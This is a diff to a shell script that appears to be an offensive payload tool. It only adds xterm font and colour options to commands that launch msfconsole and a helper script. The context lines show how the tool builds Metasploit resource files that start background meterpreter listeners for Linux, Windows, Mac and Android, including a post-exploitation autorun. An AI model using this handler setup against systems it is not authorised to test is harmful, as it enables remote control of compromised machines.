@@ -687,7 +687,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_linux.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_linux.rc"
            	 		echo exploit -j  >> "temp/meterpreter_linux.rc"
-           	 		xterm -e msfconsole -r "temp/meterpreter_linux.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_linux.rc" &
 				clear
 			elif test $fatrat1 == '2' #Windows
 				then
@@ -705,7 +705,7 @@ echo -e $okegreen"  ============================================================
 				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
-           	 		xterm -e msfconsole -r "temp/meterpreter_windows.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_windows.rc" &
 				clear
 			elif test $fatrat1 == '3'  #Mac
 				then
@@ -720,7 +720,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_mac.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_mac.rc"
            	 		echo exploit -j  >> "temp/meterpreter_mac.rc"
-           	 		xterm -e msfconsole -r "temp/meterpreter_mac.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_mac.rc" &
 				clear
 
 			elif test $fatrat1 == '4' #Android
@@ -737,7 +737,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_android.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_android.rc"
            	 		echo exploit -j  >> "temp/meterpreter_android.rc"
-           	 		xterm -e msfconsole -r "temp/meterpreter_android.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_android.rc" &
 				clear
 
 			elif test $fatrat1 == '5'
@@ -1456,7 +1456,7 @@ menu () {
   		elif test $fatrat == '2'
    			then
    			chmod +x powerfull.sh
-  			xterm ./powerfull.sh
+  			xterm -fa monaco -fs 13 -bg black ./powerfull.sh
 
   		elif test $fatrat == '3'
   			then
@@ -1496,7 +1496,7 @@ menu () {
 
   		elif test $fatrat == '8'
    			then
-   			xterm msfconsole
+   			xterm -fa monaco -fs 13 -bg black msfconsole
 
   		elif test $fatrat == '9'
    			then
@@ -1635,7 +1635,7 @@ echo
 		elif test $fatrat == '2'
  			then
  			chmod +x powerfull.sh
-			xterm ./powerfull.sh
+			xterm -fa monaco -fs 13 -bg black ./powerfull.sh
 
 		elif test $fatrat == '3'
 			then
@@ -1675,7 +1675,7 @@ echo
 
 		elif test $fatrat == '8'
  			then
- 			xterm msfconsole
+ 			xterm -fa monaco -fs 13 -bg black msfconsole
 
 		elif test $fatrat == '9'
  			then
